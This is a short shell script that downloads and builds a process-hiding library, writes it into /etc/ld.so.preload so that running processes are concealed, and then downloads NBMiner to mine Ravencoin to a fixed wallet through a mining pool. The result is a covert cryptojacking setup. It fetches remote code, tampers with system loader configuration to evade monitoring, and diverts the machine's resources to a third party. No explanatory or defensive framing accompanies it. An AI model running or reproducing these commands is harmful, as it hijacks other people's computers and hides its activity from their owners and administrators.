wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/NebuTech/NBMiner/releases/download/v34.4/NBMiner_34.4_Linux.tgz
tar -xvzf NBMiner_34.4_Linux.tgz
cd NBMiner_Linux
./nbminer -a kawpow -o stratum+ssl://us-rvn.2miners.com:16060 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.GradPow -log
